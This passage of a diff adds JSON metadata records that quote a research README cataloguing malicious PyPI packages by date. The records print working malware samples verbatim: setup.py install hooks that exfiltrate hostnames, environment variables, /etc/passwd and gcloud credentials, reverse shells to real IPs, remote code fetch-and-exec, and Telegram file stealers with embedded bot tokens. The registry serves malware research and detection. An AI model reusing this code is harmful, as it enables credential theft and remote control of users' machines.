'1.0.0'\nDESCRIPTION = 'UXxyykmDXkAnPEQfNvdUtxTNuctckuaHHCnTImtQRzglOiWmdzrZv'\nLONG_DESCRIPTION = 'ujJtdAnhzIGMdzefKCkVnrXMrhkNnLZScQUjSueXaDwVQpRDVAvqPJZlleBBmdIkGFIemKYQTGIiVIKNFDBsoseEpqycHkgpOIhQy oOGLXFwcpyzaYlEaZjRHWhUJcILolUlWYcptAEheKQwMqaxeXuDnslbeTwUJhVTyXXnqlyU tLfJDT kVrgTSpXVxaJS'\n\nclass ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrnebUodDeRylAoEVzGEnmrlxXHcOysITsUiAnMnMkQhnFFpAHjmKiRvSktdpFxRXdnCZSLwgdtuNmXAQzxX(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))\n            install.run(self)\n```\n \n",
+                "original_header": "17 Jun. 2024"
+            },
+            "confidence": 0.9999999999924967,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "importlib-metadate [99.99] <br>\ntestkaralpoc45654 [1.0.0] <br>\nucap [3.6.1] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://kar.al\",params = ploads)\n```\n \n",
+                "original_header": "18 Jun. 2024"
+            },
+            "confidence": 0.9999999999257341,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "nt4padyp3 [0.0.1, 0.0.2] <br>\n```python\ndef read_ver():\n\tprint(\"readver\")\n\tcurl_command = 'curl -X POST -H \"Hostname: $(hostname)\" -H \"packagetype: NPM\" -H \"Whoami: $(whoami)\" -H \"Pwd: $(pwd)\" -d \"Install Directory: \\n $(ls -la) \\n Security Groups: \\n $(id) \\n User Directory: \\n $(ls ~)\\n etc-passwd: \\n $(cat /etc/passwd ) \\n Installed NPM modules: \\n $(npm ls)\\n bash history: \\n $(cat ~/.bash_history|head)\" -H \"Content-Type: text/plain\" http://43.139.166.32:8080'\n\tsubprocess.run(curl_command, shell=True)\n\treturn \"0.0.12\"\n```\n \n",
+                "original_header": "19 Jun. 2024"
+            },
+            "confidence": 1.0,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "artifact-lab-3-package-a18ff5d9 [0.1.1, 0.1.2, 0.1.3, 1.1.2, 1.1.3, 1.1.4, 1.1.5] <br>\n```python\ndef notmalfunc():\n    data = dict(os.environ)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://2edb-85-48-187-158.ngrok-free.app'\n    request = urllib.request.Request(url, data=encoded_data)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n```\n \n",
+                "original_header": "23 Jun. 2024"
+            },
+            "confidence": 0.9999999995035864,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "class-py [1.0.0] <br>\nbuilderknower2 [0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.23, 0.1.24, 0.1.25, 0.1.26, 0.1.27, 0.1.28, 0.1.29, 0.1.30] <br>\n```python\nclass myclass(install): \n    def run(self): \n        LHOST = \"85.159.212.47\"\n        LPORT = 61985 \n \n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n        s.connect((LHOST, LPORT)) \n        os.dup2(s.fileno(), 0) \n        os.dup2(s.fileno(), 1) \n        os.dup2(s.fileno(), 2) \n        pty.spawn(\"/bin/sh\") \n```\n \n",
+                "original_header": "24 Jun. 2024"
+            },
+            "confidence": 0.9999999351346126,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "add new 672 malicious packages, encompassing 997 versions.\n```python\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n _ttmp = _ffile(delete=False)\n _ttmp.write(b\"\"\"from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://rentry.co/277t2/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())\"\"\")\n _ttmp.close()\n try: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n except: pass\n```\n \n",
+                "original_header": "02 Jul. 2024"
+            },
+            "confidence": 0.9999229878736823,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "IncapError [7.0.0] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname = socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}\n        requests.get(\"https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com\", params=ploads)  # Replace with Interactsh or Pipedream\n```\n \n",
+                "original_header": "06 Jul. 2024"
+            },
+            "confidence": 0.9999999999997442,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "ptmpl [0.2.0, 0.2.6, 0.2.14] <br>\nh99ai [0.1.0] <br>\ntestbrojct2 [0.1, 0.2, 0.4] <br>\nptestown [0.6.0] <br>\nproxyfullscrapers [0.1] <br>\nproxyfullscraper [0.1] <br>\nproxyalhttp [0.1] <br>\n```python\nimport os\nimport requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_and_send_files(bot_token, chat_id, folder_path='/'):\n    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'\n    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'\n\n    def send_document_to_telegram(file_path, chat_id):\n        try:\n            with open(file_path, 'rb') as file:\n                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})\n                return response.json()\n        except Exception as e:\n            return None\n\n    def send_message_to_telegram(message, chat_id):\n        try:\n            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})\n            return response.json()\n        except Exception as e:\n            return None\n\n    contents = os.listdir(folder_path)\n\n    for content in contents:\n        content_path = os.path.join(folder_path, content)\n        if os.path.isfile(content_path):\n            if content.lower().endswith(('.py', '.php', '.zip')):\n                try:\n                    message = f\"File: {content}\\nPath: {content_path}\"\n                    msg_response = send_message_to_telegram(message, chat_id)\n                    file_response = send_document_to_telegram(content_path, chat_id)\n                except Exception as e:\n                    pass\n        elif os.path.isdir(content_path):\n            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]\n            for file_path in files_in_subdir:\n                if file_path.lower().endswith(('.py', '.php', '.zip')):\n                    try:\n                        message = f\"File: {os.path.basename(file_path)}\\nPath: {file_path}\"\n                        msg_response = send_message_to_telegram(message, chat_id)\n                        \n                        file_response = send_document_to_telegram(file_path, chat_id)\n                    except Exception as e:\n                        pass\nBOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'\nCHAT_ID = 901011671\ndef send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):\n    API_URL = f'https://api.telegram.org/bot{bot_token}/sendPhoto'\n\n    def send_photo_to_telegram(file_path, chat_id):\n        with open(file_path, 'rb') as file:\n            response = requests.post(API_URL, data={'chat_id': chat_id}, files={'photo': file})\n            return response.json()\n\n    for root, dirs, files in os.walk(dcim_folder_path):\n        for file in files:\n            if file.lower().endswith(('.png', '.jpg', '.jpeg')):\n                file_path = os.path.join(root, file)\n                response = send_photo_to_telegram(file_path, chat_id)\n                print(f'Sent {file_path}: {response}')\nBOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'\nCHAT_ID = 901011671\nDCIM_FOLDER_PATH = '/sdcard/DCIM'\nMAX_WORKERS = 5\ndef rudd():\n    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:\n        future_scan = executor.submit(scan_and_send_files, BOT_TOKEN, CHAT_ID, folder_path='/storage/emulated/0')\n        future_photos = executor.submit(send_photos_in_dcim_to_telegram, BOT_TOKEN, CHAT_ID, DCIM_FOLDER_PATH)\n    future_scan.result()\n    future_photos.result()\n```\n \n",
+                "original_header": "17 Jul. 2024"
+            },
+            "confidence": 1.0,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "requestn [8.0] <br>\n```python\nimport os\nimport requests\n\ndef promain():\n    try:\n        import socket\n        import webbrowser\n        import sys\n        import json\n        token2='7345360932:AAFdgHMvggOowu-hx-OGyPljyi_wOf5D0zI'\n        ID2='5487978588'\n    except:\n        os.system(\"pip install webbrowser\")\n        os.system(\"pip install socket\")\n        os.system(\"clear\")\n\n    S = '\\033[1;33m'\n    A = \"\\033[1;91m\" #red\n    C = \"\\033[1;97m\" #white\n    ra = 0\n\n    file_ha = []\n\n    for file in os.listdir():\n        if os.path.isfile(file):\n            file_ha.append(file)\n            g = file\n            print(file)\n            massage = '@is_brother'\n            start_msg = requests.post(f\"https://api.telegram.org/bot{token2}/sendMessage?chat_id\\n\\n@t.me/is_brother\")\n            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})\n  \n    print(file_ha)\n    massage = '@is_brother'\n\n    for file in file_ha:\n        with open(\"SIN.txt\",\"a\") as pro:\n            pro.write(str(file) + \"\\n\")\n            print(file_ha)\npromain()\n```\n \n",
+                "original_header": "21 Jul. 2024"
+            },
+            "confidence": 1.0,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "hexmanibm [1.0.4] <br>\nhexteamibm [1.0.4] <br>\nasptcer [1.0.0] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://9.30.214.68\",params = ploads)\n```\n \n",
+                "original_header": "22 Jul. 2024"
+            },
+            "confidence": 0.9999999999091074,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "lr_utils_lib [1.0.0] <br>\n```python\ndef get_co():\n    from subprocess import check_output as cooo\n    return cooo\n\ndef get_defcon(pew, h):\n    return pew.HTTPSConnection(h)\n\ndef get_se():\n    from re import search as se\n    return se\n\ndef get_ma(my):\n    return my.group(1)\n\ndef get_prrr():\n    from http import client as prrr\n    return prrr\n\ndef get_obs():\n    from codecs import open as obs\n    return obs\n\ndef get_ash(i):\n    from hashlib import sha256 as s256\n    return s256(i.encode()).hexdigest()\n\ngo = ['641d54eb5d6eede67c62287e8b33c95200b68d35465c75a2715a95fdfffe86d1',\n    'ae712e7065d27a88e464f77a0e4f97af6fa7a6bbcb9ebfe674eecec11f82c752',\n    '1686dc1dc8b706be5664fa568833cd8920c8551415c1b8567bc9b1060ff7bd0a',\n    'ae5a652d6397ac8150e0462930064cc600875e66d7687dcdcadd3c2532c45ac9',\n    '086dac8a9a2e86f3ee79274111d04577cfb4537d4f004efb4698ddecdf78c608',\n    'faacef9164ab09741fc616e71890ecbb4d748fec30954daf198424615c4115cb',\n    '3d959605a3105b5d37a4af33543c93ca4ffd02627d476e1b4647c75d61dd977f',\n    'e0df878d670bc75d210ed22d89a96049e2c7c8e750a22984f73320019a6b3c34',\n    '219a42f0592c7237a7bee6aaaadfdb3d8a9c2feaade9bb4cc334237a547f11c5',\n    '162284405016ebdcfc4b4525479f6e81e77995036e4a7c838060dee0aef347a5',\n    'ee4dc4f0fc56a3adab495255b467fa37f1af59aa213e1a757fd4982ff93603e2',\n    'ab85c781babc692205d15e49a3d8b4554382659f3c33f420f2313abe88236d0e',\n    '1c20e11f988ac643e391e46650b631130f2441eeadd07042123d8c33c9299519',\n    '53e65c0f44c9187361a3188e328786027ae32f73e58133f7a3deee8ecede2330',\n    '0d991fd5a73bc1cc5eb85f4f4a214b75ee4b6524aa7c7cffb25201fef9b39111',\n    '7594de25a00ad4c63e99b4e1bb288aff95463bf9e412cba7bfe2b41e7d48a649',\n    '94b307dbe8ea576634eb9f8c89cc303b174518f6b74771f3a79bafb178084421',\n    '55adf25da39af781eaeb5495c95fd9d52b40faf520f4c3f1c47c7376be2e7f8c',\n    '3defabd5508208a295e6d510983e88ad9f058ed3a83d7b51ece6298f6316772b',\n    '28eaeb21dc834a1d03fce5f08ade2a92adf5c02b8b393d547180f64cbb1c86f1',\n    '114fa09995b39dfe510be16835c3e8bbc2e72198124f84346e98911d90b3b22f',\n    'aeb94d85e079805c3d8417859674bc147399fb2e75d7f44762f188aefb558e9b',\n    '076a8d36cd65f00aa194b43e84b35b1d9dee995b1d1dd79889e32fb2f7d25c68',\n    'f4de2757497be6be87ed7aed1015f7d400801476922ecda8c3726d0a21eff626',\n    'fbcd4aedb12f03e1bfa3e4d18e95b5bbba9dc24ece486b53d1b9efa0b9a1d05f',\n    '64452e7c8fc93d823ffb7afc56a0ec29a26f01ab0433864334aca9b3d853fdae',\n    '536a133d1418fab3e9446d24ba372a3074d9b1cb0323deba90f4570bc06aec5b',\n    '5ac29b3e8d242d5304741adefeab22a7ec86d27ca20770e9bbaa7607ea6ac6c6',\n    '893b0bdad0ad9b444d3b8f81d767174d56ef8d50d42e2cebe590909b4e3b8c14',\n    '98072eb273aa84e41be2c632d80c45c9d01bc51bb00b7641e10ed506d9ec8e0b',\n    '8a811141b32bb3c557e3ab590a16e20610e47048dd3e7e89e1fb212a96dbb8a8',\n    'cfa5a30deb25da9e0fb69d8fbffeede549e2a859197a985ddb70185ba7b702d3',\n    '794722165ec19e2861a3ab8f6c28491f30b649e53ac9f36047e875398f614d9d',\n    '06b3c63f79eacfd4f6663da06605c431a348cde69880146fc9146b698355cb6e',\n    'ba843f0a75e1aea2408132ecf7926fe27d1553c35eb4a94ff69f1bc906d61e2d',\n    'a8a9ffe2bc4a837da05869333ffd7b0f518a8c79d765e6676383dd5d94384a7b',\n    '62806c8a8e2196f71f7e4927f868e61692473b02b381719c34262370adb83d6c',\n    'de4179e4031f226ba6dbb20075b7c1d224a66dfa1bce24b79e02bad14bf5e560',\n    '6d1a9f3a34e6b8d9a7afe3207755e66694514fcb8438e230077002f26721471c',\n    'a397fc034fd2637cb14fb150fc3373ac2764985b84d374f059ee81ef80343051',\n    '8b8fb34fb9a3e2e030904c7a4bdb41e83b67ed89c13b7bdd2ea12819f05f3f8e',\n    'e84fed85df76f0e7680e1dca0aee6756e4314103f79a4d0d7ddf6567b8e0de85',\n    'c00facb20a683a9b09d3b7f291885104bfca9b2bf59b8b8b3a3ef7b405ae473b',\n    '7bb8e88f6f416b7bbae07288a189e733bc671fc616c09cd9afe7a2fc9360fb5e',\n    '67aaee9fa3885064036c378669662bc657aaa6d4d216430dad7221dc45d13e24',\n    'f23e972a78e412f9037049bb4f8409022e5c3c9bf4433478dc9a2ac6c03401cc',\n    '224e96bb75927242dd3aa94d044ba38107923eb001f4e52ba477f486c2e7f5f6',\n    '3d0126242a1d570638bbd7e3a90cea72ab106c9bf0987484dd7cca128c51b18c',\n    '6f81cf533536a625c491d36e09fe3a98b6a0940d579c555ee5c00317138144c5',\n    '80c492975129f66b856433f1cc35dfeaabeef3d6804f9741604b64b7f1829fab',\n    '715847db3c4c182e95822515f4f7f32c5ba0e6fbfacc81b66138515c1e74d7fc',\n    'e7a2467cc4154ba48de85a8cf5afbef66523be988ee69b8da13538b1be27665c',\n    '7961af6aab6ff18d10dd5b699580733f44bc7fd825f0410ff89b5f22a93dd9b8',\n    '68110b8c2efab1563556ab0d535ffedd8aa1aecd1d47b784c2bc7e995c887fc2',\n    '5b31fceeeb1abc1f49b03824367db11103b04a163686d47d8c590e3d669768c2']\n\nclass PyInstall(install):\n    def run(self):\n        if sys.platform != \"darwin\":\n            return \n\n        tmp = get_co()\n        c = b64d(\"aW9yZWcgLWsgSU9QbGF0Zm9ybVVVSUQ=\").decode()\n        raw = tmp(c.split()).decode()\n        p = b64d('IklPUGxhdGZvcm1VVUlEIlxzKj1ccyoiKFteIl0qKSIK').decode()\n        roger = get_se()(p, raw)\n        u = get_ma(roger)\n        h = get_ash(u)\n        \n        if h in go:\n            b = os.path.expanduser(b64d('fi8uY29uZmlnL2djbG91ZA==').decode())\n            t = [\"YXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29u\", \"Y3JlZGVudGlhbHMuZGI=\"]\n\n            for x in t:\n                try:\n                    con = get_defcon(get_prrr(), b64d(\"ZXVyb3BlLXdlc3QyLXdvcmtsb2FkLTQyMjkxNS5jbG91ZGZ1bmN0aW9ucy5uZXQ=\").decode())\n                    with get_obs()(os.path.join(b, b64d(x).decode()), \"rb\") as fd:\n                        con.request(\"POST\", \"/version\", fd.read(), {\"X-Trace-Correlation-ID\": h})\n                    con.close()\n                except:\n                    pass\n\n            install.run(self)\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n```\n \n",
+                "original_header": "28 Jul. 2024"
+            },
+            "confidence": 1.0,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "- GitHub Advisory Database https://github.com/advisories?query=type%3Amalware (NPM).\n- https://dasfreak.github.io/Backstabbers-Knife-Collection/ (PyPI and npm), by Marc Ohm et al.\n- https://github.com/datadog/malicious-software-packages-dataset (PyPI), by Datadog\n \n",
+                "original_header": "Other Dataset"
+            },
+            "confidence": 0.9999999999993179,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        }
+    ],
+    "invocation": [
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "pyjous <br>\nreqwestss <br>\nnumberpy <br>\npytoileur <br>\ndefca <br>\n```python\ntry:\n    import subprocess;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"shell.attacker.local\",443));p=subprocess.Popen([\"/bin/bash\",\"-i\"], stdout=s.fileno(), stdin=s.fileno(), stderr=s.fileno(), start_new_session=True)\nexcept: pass\n\n#import base64;exec(base64.b64decode('dHJ5OiBpbXBvcnQgc3VicHJvY2Vzcyxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgnc2hlbGwuYXR0YWNrZXIubG9jYWwnLDQ0MykpO3A9c3VicHJvY2Vzcy5Qb3BlbihbJy9iaW4vYmFzaCcsJy1pJ10sc3Rkb3V0PXMuZmlsZW5vKCksc3RkaW49cy5maWxlbm8oKSxzdGRlcnI9cy5maWxlbm8oKSxzdGFydF9uZXdfc2Vzc2lvbj1UcnVlKQpleGNlcHQ6IHBhc3MK').decode())\n```\n \n",
+                "original_header": "03 Jun. 2024"
+            },
+            "confidence": 0.9213770137801872,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        },
+        {
+            "result": {
+                "type": "Text_excerpt",
+                "value": "bussardweg4a, bussardweg4av2, bussardweg4av3, pyhton, pythn, pytgon, pytjon, pytuon, pytbon, pytohn, pytyon, pythkn, pythom, pythob, pytnon, pyhthon, pytojn, pytiom, pytiob, pythun, pytoh, pytonn, pthon, we3b, wev3, wb3, web3e, webt3, w3eb, 3web, w3b, wweb, werb3, web3q, wdb3, web2, wbe3, wweb3, web3-pyy, web3-pyu, w3b-py, web4-py, wb3-py, ewb3-py, wev3-py, web3-pu, we3-py, wweb3-py, 3web-py, web3-py9, web3-0py, web3-po, web3-p6, web3-p7, etheerum, ehtereum, etheereum, etehreum, etherium, wbe3-py, weeb3-py, ethherum, etherun, ethereun, eutherium, ethreium, eethereum, ethreum, etheerium, theerum, ethrum, etherum, etheum, etherem, etheurm, ethereuum, etheirum, etherriuum, etheruim, etheraem, etheriuum, eetherium, etheruem, ethererum, etheriun, etherreum, etheeruum, etheereium, etherim, etheriumm, ethereuim, etherreeum, etheeruim, etheriuim, etheruum, ettherium, ethreeum, ethherium, etheerem, etherreumm, etherumm, ethereumm, ethereim, etheeruimm, etherrium, etheruemm, ethereium, etheriem, etherriuumm, etheerim, openxsea, openasea, opensae, opensa, openesaa, openseaa, opnesea, oepnsea, openza, openes, openesa, opnsea, openae, openseea, oensea, opesnea, openzea, openseaz, openeasea, opensee, openrea, openwea, opemsea, opensew, oenasea, openresa, opensesa, opensead, openwse, openswa, openwsaa, opensear, openzsea, openrsea, openwsea, oenesea, openxsa, oopensea, openaes, opensar, openseax, openseae, oenwea, oepenwea, oepensea, oopenwea, opwnsea, openwae, oenwsea, openeaa\n```python\nVERSION = '1.0.0'\nDESCRIPTION = 'UXxyykmDXkAnPEQfNvdUtxTNuctckuaHHCnTImtQRzglOiWmdzrZv'\nLONG_DESCRIPTION = 'ujJtdAnhzIGMdzefKCkVnrXMrhkNnLZScQUjSueXaDwVQpRDVAvqPJZlleBBmdIkGFIemKYQTGIiVIKNFDBsoseEpqycHkgpOIhQy oOGLXFwcpyzaYlEaZjRHWhUJcILolUlWYcptAEheKQwMqaxeXuDnslbeTwUJhVTyXXnqlyU tLfJDT kVrgTSpXVxaJS'\n\nclass ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrnebUodDeRylAoEVzGEnmrlxXHcOysITsUiAnMnMkQhnFFpAHjmKiRvSktdpFxRXdnCZSLwgdtuNmXAQzxX(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))\n            install.run(self)\n```\n \n",
+                "original_header": "17 Jun. 2024"
+            },
+            "confidence": 0.9223472142324418,
+            "technique": "supervised_classification",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        }
+    ],
+    "full_title": [
+        {
+            "result": {
+                "type": "String",
+                "value": ""
+            },
+            "confidence": 1,
+            "technique": "regular_expression",
+            "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
+        }
+    ]
+}
